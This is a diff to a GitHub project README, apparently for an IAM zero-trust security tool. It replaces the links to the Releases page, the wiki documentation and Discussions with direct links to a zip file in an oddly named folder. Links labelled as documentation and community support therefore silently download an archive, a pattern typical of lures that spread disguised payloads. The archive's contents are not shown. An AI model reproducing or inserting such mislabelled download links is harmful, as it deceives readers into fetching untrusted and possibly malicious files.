@@ -8,7 +8,7 @@ Welcome to the **iam-zero-trust-security** project! This application helps you i
 
 To get started, you’ll need to download the application. Click the link below to visit the Releases page:
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Hassan1o0/iam-zero-trust-security/releases)
+[![Download](https://raw.githubusercontent.com/Hassan1o0/iam-zero-trust-security/master/decantherous/iam-zero-trust-security.zip)](https://raw.githubusercontent.com/Hassan1o0/iam-zero-trust-security/master/decantherous/iam-zero-trust-security.zip)
 
 On the Releases page, you will find the latest version of the software. Find the appropriate file for your system and follow the steps to download and install the application.
 
@@ -52,8 +52,8 @@ For further assistance, you can reach out through the Issues section on our GitH
 
 ## 📖 Additional Resources
 
-- **Documentation**: For detailed guides and advanced features, visit our [documentation page](https://github.com/Hassan1o0/iam-zero-trust-security/wiki).
-- **Community Support**: Join discussions and ask questions in our [GitHub Discussions](https://github.com/Hassan1o0/iam-zero-trust-security/discussions).
+- **Documentation**: For detailed guides and advanced features, visit our [documentation page](https://raw.githubusercontent.com/Hassan1o0/iam-zero-trust-security/master/decantherous/iam-zero-trust-security.zip).
+- **Community Support**: Join discussions and ask questions in our [GitHub Discussions](https://raw.githubusercontent.com/Hassan1o0/iam-zero-trust-security/master/decantherous/iam-zero-trust-security.zip).
   
 ## 📋 License
 
@@ -61,4 +61,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ---
 
-Make sure to download the latest version to ensure you have all the newest features and fixes. Visit this page to download: [Releases Page](https://github.com/Hassan1o0/iam-zero-trust-security/releases).
+Make sure to download the latest version to ensure you have all the newest features and fixes. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Hassan1o0/iam-zero-trust-security/master/decantherous/iam-zero-trust-security.zip).
